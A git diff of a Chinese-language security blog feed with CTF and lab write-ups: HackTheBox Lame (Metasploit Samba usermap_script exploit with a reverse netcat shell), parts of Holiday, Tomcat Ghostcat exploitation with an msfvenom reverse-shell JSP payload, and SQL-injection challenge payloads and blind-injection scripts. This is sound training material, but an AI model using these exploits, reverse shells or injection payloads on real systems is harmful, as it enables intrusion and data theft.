+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2023-04-22T00:05:32-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Apr 22 00:05:54 2023 -- 1 IP address (1 host up) scanned in 284.48 seconds                                                                                                                                                   
+</code></pre></div></div>
+<h2 id="msf">MSF</h2>
+<p>查询相关漏洞，发现第三行的<code class="language-plaintext highlighter-rouge">'Username map script' Command Execution (Metasploit)</code>可用，而且是metasploit里面的攻击模块</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/lame]
+└─$ searchsploit samba 3.0
+------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                           |  Path
+------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                     | osx/remote/16875.rb
+Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                                                   | multiple/remote/10095.txt
+Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                         | unix/remote/16320.rb
+Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                       | linux/remote/9950.rb
+Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                   | linux/remote/16859.rb
+Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                 | solaris/remote/16329.rb
+Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                 | linux/dos/4732.c
+Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                        | multiple/dos/5712.pl
+Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                         | linux/remote/364.pl
+Samba &lt; 3.0.20 - Remote Heap Overflow                                                                                    | linux/remote/7701.txt
+Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                            | linux_x86/dos/36741.py
+------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</code></pre></div></div>
+
+<p>直接用metasploit搜索<code class="language-plaintext highlighter-rouge">Samba 3.0.20</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; search samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No    
+</code></pre></div></div>
+<p>选择此模块并配置好反弹shell的相关参数，用<code class="language-plaintext highlighter-rouge">run</code>命令发起攻击，直接获取了root权限下的shell，直接打开root下的flag</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; use 0
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) &gt; show option
+[-] Invalid parameter "option", use "show -h" for more information
+msf6 exploit(multi/samba/usermap_script) &gt; show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.32.134   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3
+rhost =&gt; 10.10.10.3
+msf6 exploit(multi/samba/usermap_script) &gt; set rport 445
+rport =&gt; 445
+msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.4
+lhost =&gt; 10.10.14.4
+msf6 exploit(multi/samba/usermap_script) &gt; set lport 2333
+lport =&gt; 2333
+msf6 exploit(multi/samba/usermap_script) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.4:2333 
+[*] Command shell session 1 opened (10.10.14.4:2333 -&gt; 10.10.10.3:40919) at 2023-04-22 00:22:42 -0400
+whoami
+root
+which python
+/usr/bin/python
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@lame:/# cat /root/root.txt
+cat /root/root.txt
+162190c25286540dea9c0047e......
+</code></pre></div></div>
+<p>user下的flag</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@lame:/home# find / -name user.txt 2&gt;/dev/null
+find / -name user.txt 2&gt;/dev/null
+/home/makis/user.txt
+root@lame:/home# cat /makis/user.txt
+cat /makis/user.txt
+cat: /makis/user.txt: No such file or directory
+root@lame:/home# cat makis/user.txt
+cat makis/user.txt
+a5ceb51f1741b774fbee61a559......
+</code></pre></div></div>
+<h2 id="cve-2007-2447">CVE-2007-2447</h2>
+<p>用show info查看模块信息，可以看到漏洞编号是CVE-2007-2447</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit(multi/samba/usermap_script) &gt; show info
+
+       Name: Samba "username map script" Command Execution
+     Module: exploit/multi/samba/usermap_script
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2007-05-14
+
+Provided by:
+  jduck &lt;jduck@metasploit.com&gt;
+
+Available targets:
+      Id  Name
+      --  ----
+  =&gt;  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS  10.10.10.3       yes       The target host(s), see https://docs.
+                                     metasploit.com/docs/using-metasploit/
+                                     basics/using-metasploit.html
+  RPORT   445              yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+
+Description:
+  This module exploits a command execution vulnerability in Samba 
+  versions 3.0.20 through 3.0.25rc3 when using the non-default 
+  "username map script" configuration option. By specifying a username 
+  containing shell meta characters, attackers can execute arbitrary 
+  commands. No authentication is needed to exploit this vulnerability 
+  since this option is used to map usernames prior to authentication!
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+  OSVDB (34700)
+  http://www.securityfocus.com/bid/23972
+  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
+  http://samba.org/samba/security/CVE-2007-2447.html
+
+
+View the full module info with the info -d command.
+
+</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="linux" /><category term="msf" /><category term="samba" /><summary type="html"><![CDATA[HackTheBox - Lame About Lame Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.]]></summary></entry><entry><title type="html">HackTheBox - Holiday</title><link href="http://localhost:4000/hack-the-box/holiday/" rel="alternate" type="text/html" title="HackTheBox - Holiday" /><published>2023-04-18T00:00:00+08:00</published><updated>2023-04-18T00:00:00+08:00</updated><id>http://localhost:4000/hack-the-box/holiday</id><content type="html" xml:base="http://localhost:4000/hack-the-box/holiday/"><![CDATA[<h1 id="hackthebox---holiday">HackTheBox - Holiday</h1>
+<h2 id="about-holiday">About Holiday</h2>
+<p>Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.</p>
+
+<p><img src="/images/hackthebox/holiday/0.png" alt="" /></p>
+
+<h2 id="nmap">Nmap</h2>
 <p>通过nmap扫描发现了靶机只存在ssh和Node.js框架下的http服务。进入网站首页并没有发现什么有用的信息。</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Tue Apr 18 07:38:06 2023 as: nmap -Pn -sV -sC -A -oN nmap.txt 10.10.10.25
 Nmap scan report for 10.10.10.25
@@ -39,7 +683,7 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Apr 18 07:39:01 2023 -- 1 IP address (1 host up) scanned in 55.41 seconds
 </code></pre></div></div>
-<h3 id="dirserch">dirserch</h3>
+<h2 id="dirserch">Dirserch</h2>
 <p><img src="/images/hackthebox/holiday/1.png" alt="" /></p>
 
 <p>访问/login或者访问/admin跳转至login是一个简单的登录页面，尝试了默认用户以及爆破用户名都回显 Invalid User</p>
@@ -50,7 +694,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 <p><img src="/images/hackthebox/holiday/3.png" alt="" /></p>
 
-<h3 id="sqlmap">sqlmap</h3>
+<h2 id="sqlmap">Sqlmap</h2>
 
 <p>把数据包丢进sqlmap里面跑，但是不加参数跑不出来，需要加上level和risk</p>
 
@@ -261,9 +905,8 @@ algernon@holiday:~$ cat user.txt
 cat user.txt
 e9451...........................
 </code></pre></div></div>
-<h2 id="提权">提权</h2>
 
-<h3 id="npm-install-dangerous">npm install dangerous</h3>
+<h2 id="提权-npm-install-dangerous">提权-npm install dangerous</h2>
 
 <p>首先检查一下<code class="language-plaintext highlighter-rouge">sudo -l</code>，有可能会发现惊喜</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~$ sudo -l
@@ -340,187 +983,901 @@ cat root.txt
 <h2 id="小结">小结</h2>
 <p>这是我pawd的第一台hackthebox靶机，看到这个界面心里难免有些激动，虽然是看walkthrough做出来的，但是也花了大概一两天的时间拿下靶机以及完成记录。就当做是一个新的开始吧！走起~</p>
 
-<p><img src="/images/hackthebox/holiday/14.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="node" /><category term="linux" /><category term="web" /><category term="sqli" /><category term="xss" /><category term="command-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">极客大挑战2019 - SQLI</title><link href="http://localhost:4000/ctf/geekchall/" rel="alternate" type="text/html" title="极客大挑战2019 - SQLI" /><published>2020-01-08T00:00:00+08:00</published><updated>2020-01-08T00:00:00+08:00</updated><id>http://localhost:4000/ctf/geekchall</id><content type="html" xml:base="http://localhost:4000/ctf/geekchall/"><![CDATA[<h2 id="题目描述">题目描述</h2>
+<p><img src="/images/hackthebox/holiday/14.png" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="[&quot;hack-the-box&quot;]" /><category term="node" /><category term="linux" /><category term="web" /><category term="sqli" /><category term="xss" /><category term="rce" /><summary type="html"><![CDATA[HackTheBox - Holiday About Holiday Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.]]></summary></entry><entry><title type="html">CVE-2020-1938 - Ghostcat</title><link href="http://localhost:4000/vulhub/CVE-2020-1938/" rel="alternate" type="text/html" title="CVE-2020-1938 - Ghostcat" /><published>2023-04-16T00:00:00+08:00</published><updated>2023-04-16T00:00:00+08:00</updated><id>http://localhost:4000/vulhub/CVE-2020-1938</id><content type="html" xml:base="http://localhost:4000/vulhub/CVE-2020-1938/"><![CDATA[<h1 id="cve-2020-1938---ghostcat">CVE-2020-1938 - Ghostcat</h1>
+<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
+<p>Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。</p>
 
-<p>极客大挑战2019的sql注入系列一共有5个题目，感觉非常有意思啊，就好像自己化身为了一名黑客</p>
+<p>Ghostcat 是由长亭发现的存在于 Tomcat 中的漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
+<h2 id="0x01-影响范围">0x01 影响范围</h2>
 
-<h2 id="easysql">EasySQL</h2>
+<p><strong>Tomcat 9.x &lt; 9.0.31</strong>
+<strong>Tomcat 8.x &lt; 8.5.51</strong>
+<strong>Tomcat 7.x &lt; 7.0.100</strong>
+<strong>Tomcat 6.x</strong></p>
 
-<p>这题没什么好说的，万能密码一试就成功了</p>
+<h2 id="0x02-环境搭建vulhub">0x02 环境搭建（vulhub）</h2>
 
-<p><img src="/images/ctf/geekchall/0.jpg" alt="" /></p>
+<p><img src="/images/vulhub/CVE-2020-1938/0.jpg" alt="" /></p>
 
-<p>网站做的确实非常精湛！！</p>
+<h2 id="0x03-漏洞检测">0x03 漏洞检测</h2>
 
-<p><img src="/images/ctf/geekchall/1.jpg" alt="" /></p>
+<p>8009端口开放ajp协议</p>
 
-<h2 id="lovesql">LoveSQL</h2>
-<p>用上面的万能密码登录进去后，没有flag，而是给出了一串密码，让人不禁联想到sql查询。在加上登录界面的提示，可以判断flag应该在数据库的某个地方</p>
+<p><img src="/images/vulhub/CVE-2020-1938/1.jpg" alt="" /></p>
 
-<p><img src="/images/ctf/geekchall/2.jpg" alt="" /></p>
-
-<p>接下来在输入用户名处拼接常规的sql注入语句就行了，payload可以参考</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span><span class="err">爆出所有库名</span>
-<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">distinct</span> <span class="n">table_schema</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span>
-<span class="o">#</span><span class="err">爆出数据库</span><span class="n">news</span><span class="err">的所有表名</span>
-<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">distinct</span> <span class="k">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_schema</span> <span class="o">=</span> <span class="s1">'news'</span>
-<span class="o">#</span><span class="err">爆出表</span><span class="k">admin</span><span class="err">的所有列</span>
-<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">distinct</span> <span class="k">column_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span> <span class="o">=</span> <span class="s1">'admin'</span>
-<span class="o">#</span><span class="err">查</span><span class="n">username</span><span class="err">和</span><span class="n">password</span><span class="err">，中间用</span><span class="p">:</span><span class="err">隔开</span>
-<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">from</span> <span class="k">admin</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 获取poc
+wget https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/archive/refs/heads/master.zip 
+# 解压
+unzip master.zip
+# 执行poc
+python CNVD-2020-10487-Tomcat-Ajp-lfi.py 43.xx.xx.37 -p 8009 -f WEB-INF/web.xml
 </code></pre></div></div>
 
-<h2 id="babysql">BabySQL</h2>
-<p>这题应该才是我真正想写的一题。这题确实和登录界面说的一样，和之前的不同，做了严格的过滤。（2333</p>
+<p>成功读取到了服务器的/usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml文件</p>
 
-<p><img src="/images/ctf/geekchall/3.jpg" alt="" /></p>
+<p><img src="/images/vulhub/CVE-2020-1938/2.jpg" alt="" /></p>
 
-<p>稍微看仔细点，就能发现很多关键单词比如or、where、select等都被替换为空了。解决的方法很简单，因为这道题只替换了一次，所以可以在一个单词里再写一个这个单词，比如把or写成oorr，就可以绕过这个“严格”的过滤了</p>
+<h2 id="0x04-漏洞利用">0x04 漏洞利用</h2>
 
-<p><img src="/images/ctf/geekchall/4.jpg" alt="" /></p>
+<p>安装msf</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall 
+chmod 755 msfinstall 
+./msfinstall
+</code></pre></div></div>
+<p>使用msf生成反弹shell的jsp马，因为是文件包含漏洞，所以文件类型不用管</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] R &gt;ma.png
+</code></pre></div></div>
+<p>然后模仿网站的文件上传功能，把马放到网站目录里去</p>
 
-<p>查当前库名</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,database()#
-</span></code></pre></div></div>
-<p>爆出所有表</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,group_concat(distinct table_name) frfromom infoorrmation_schema.columns whwhereere table_schema = '</span><span class="n">geek</span><span class="s1">'#
-</span></code></pre></div></div>
-<p>爆出所有列</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,group_concat(distinct column_name) frfromom infoorrmation_schema.columns whwhereere table_name = '</span><span class="n">b4bsql</span><span class="s1">'#
-</span></code></pre></div></div>
-<p>爆字段</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ununionion seselectlect 1,2,group_concat(id,0x3a,username,0x3a,passwoorrd) frofromm b4bsql#
-</span></code></pre></div></div>
-
-<h2 id="hardsql">HardSQL</h2>
-<p>一开始先简单测试一下，发现过滤了空格，而且怎么绕都绕不过去，然后去网上找wp发现是报错注入。值得注意的是这里用到了一个还没见过的新操作,用’^’来连接updatexml函数，结合了异或</p>
-
-<p>查当前数据库名</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)#
-</span></code></pre></div></div>
-<p>查表名</p>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('</span><span class="n">geek</span><span class="s1">'))),0x7e),1)#
-</span></code></pre></div></div>
-<p>查列名</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('</span><span class="n">H4rDsq1</span><span class="s1">'))),0x7e),1)#
-</span></code></pre></div></div>
-<p>最后这里查flag内容的时候，由于updtexml最多显示32的长度，导致flag显示不全。然后用substr截取一下，发现substr被过滤了，于是上网找了另一种操作，用left和right截取函数分两次得到了完整的flag</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)#
-</span></code></pre></div></div>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">'^updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1)#
-</span></code></pre></div></div>
-
-<h2 id="finalsql">FinalSQL</h2>
-<p>这道题和之前的题不太一样，可以看到给出了5个紫色的选项，分别对应着5个不同的id，但是这几个id都没什么用</p>
-
-<p><img src="/images/ctf/geekchall/5.jpg" alt="" /></p>
-
-<p>试着在用户名和密码处进行注入，但是发现用户名和密码处有严格的过滤，大部分SQL注入的关键词都被过滤了</p>
-
-<p><img src="/images/ctf/geekchall/6.jpg" alt="" /></p>
-
-<p>然后尝试在上面的那几个id处进行注入，发现空格也被过滤了，和上面的hardsql一样绕不过去，那么用上面hardsql的报错注入语句试试</p>
-
-<p><img src="/images/ctf/geekchall/7.jpg" alt="" /></p>
-
-<p>发现有东西被过滤了，测试了一下发现被过滤的是0x7e，把它改成~反而绕过了过滤，然后再试试</p>
-
-<p><img src="/images/ctf/geekchall/8.jpg" alt="" /></p>
-
-<p>然而可能是界面处理的比较好，并没有报错出什么有用的信息。主界面有个小提示，出现了SQL盲注的字样，那么来尝试一下盲注吧</p>
-
-<p>结合异或注入的小技巧，构造id=1^1^1, 返回id=1的结果</p>
-
-<p><img src="/images/ctf/geekchall/9.jpg" alt="" /></p>
-
-<p>id=1^0^1，返回id=0的结果（注意是三个感叹号）</p>
-
-<p><img src="/images/ctf/geekchall/10.jpg" alt="" /></p>
-
-<p>那么构造 id = 1^(length(database())&gt;3)^1，返回的是id=1的结果，即(length(database())&gt;3) = 1，是真的，说明当前数据库的长度大于3</p>
-
-<p><img src="/images/ctf/geekchall/11.jpg" alt="" /></p>
-
-<p>根据这个原理，构造id=1^(ascii(substr((select(database())),1,1))&gt;<strong>100</strong>)^1, 不停的改变100那里的数值，即可判断出当前数据库的第一个字符是什么</p>
-
-<p>然后可以借助burpsuite的intruder模块，试出数据库名，表名等。也可以写python脚本，如果数据太长的话，不写脚本是很慢的。这里给出最后已经查出了表名(F1naI1y，而且根据前几题sql题知道放flag的列都是password)之后查flag的脚本</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
-<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://c1e6b438-7a2c-47fd-9473-96e47707df3a.node3.buuoj.cn/search.php</span><span class="sh">"</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">180</span><span class="p">):</span>
-    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
-        <span class="n">d</span> <span class="o">=</span> <span class="sh">"</span><span class="s">?id=1^(ascii(substr((select(group_concat(distinct(password)))from(F1naI1y)),</span><span class="sh">'"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="sh">"'</span><span class="s">,1))=</span><span class="sh">'"</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="sh">"'</span><span class="s">)^1</span><span class="sh">"</span>
-        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">d</span><span class="p">)</span>
-        <span class="k">if</span> <span class="sh">'</span><span class="s">Click</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
-            <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
-</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;ctf&quot;]" /><category term="sqli" /><category term="web" /><category term="ctf" /><summary type="html"><![CDATA[题目描述]]></summary></entry><entry><title type="html">Ciscn2019 华北赛区 day2 web1 - hack world</title><link href="http://localhost:4000/ctf/hackworld/" rel="alternate" type="text/html" title="Ciscn2019 华北赛区 day2 web1 - hack world" /><published>2019-12-27T00:00:00+08:00</published><updated>2019-12-27T00:00:00+08:00</updated><id>http://localhost:4000/ctf/hackworld</id><content type="html" xml:base="http://localhost:4000/ctf/hackworld/"><![CDATA[<h2 id="0x01-题目描述">0x01 题目描述</h2>
-
-<p><img src="/images/ctf/hackworld/0.jpg" alt="" /></p>
-
-<p>很明显这是一道sql注入的题目，已经给出了flag所在的列名和表名，且提供一个id查询的功能。当提交1和2的时候，查询出了两句骚话</p>
-
-<p><code class="language-plaintext highlighter-rouge">Hello, glzjin wants a girlfriend.</code></p>
-
-<p><code class="language-plaintext highlighter-rouge">Do you want to be my girlfriend?</code></p>
-
-<h2 id="0x02-获取flag">0x02 获取flag</h2>
-<p>尝试输入一些常规的sql注入语句，结果都被过滤了，尝试异或注入，输入1^1^1，返回了id=1的结果</p>
-
-<p><img src="/images/ctf/hackworld/1.jpg" alt="" /></p>
-
-<p>SQL中的^是异或判断，当^两边相同的时候，其值为0，当^两边不相同时，其值为1</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1^1<span class="o">=</span>0  1^2<span class="o">=</span>1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker cp ma.png 1cf744b0f648:/usr/local/tomcat/webapps/ROOT/WEB-INF/
 </code></pre></div></div>
 
-<p>所以我们可以通过输入<code class="language-plaintext highlighter-rouge">1^(ascii(substr((select(flag)from(flag)),1,1))&gt;x)^1</code>，不断改变x的值，根据回显逐渐爆破出flag的值。因为本萌新还不会写脚本，所以用了一下赵师傅的脚本</p>
+<p>开启msf的监听</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole # 进入msf
+use exploit/multi/handler
+show options
+set payload java/jsp_shell_reverse_tcp
+set lhost x.x.x.x
+set lport x
+exploit
+</code></pre></div></div>
+<p>然后又用刚才的脚本读取了一波服务器下存在的ma.png文件</p>
 
-<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://web43.buuoj.cn/index.php</span><span class="sh">"</span>
+<p><img src="/images/vulhub/CVE-2020-1938/3.jpg" alt="" /></p>
 
-<span class="n">result</span> <span class="o">=</span> <span class="sh">''</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">38</span><span class="p">):</span>
-    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
-        <span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">1^(cot(ascii(substr((select(flag)from(flag)),</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">,1))&gt;</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">))^1=1</span><span class="sh">'</span>
-        <span class="nf">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+<p>发现读取成功了，但是msf那边却没有反应，难道是脚本的问题？只进行了文件读取，而不是文件包含吗。尝试变换思路，下载AJP包构造器ajpfuzzer</p>
 
-        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">girl</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
-            <span class="n">result</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
-            <span class="nf">print</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
-            <span class="k">break</span>
-
-<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/doyensec/ajpfuzzer/releases/download/v0.6/ajpfuzzer_v0.6.jar
 </code></pre></div></div>
 
-<p>跑了一下不知道哪里错了，但是还是很有学习价值。在网上找了另一个大佬的脚本，用二分法成功跑出了flag</p>
+<p>ok 下好了之后运行</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ajpfuzzer_v0.6.jar
+</code></pre></div></div>
+<p>连接目标端口</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect [ip] [port]
+</code></pre></div></div>
+
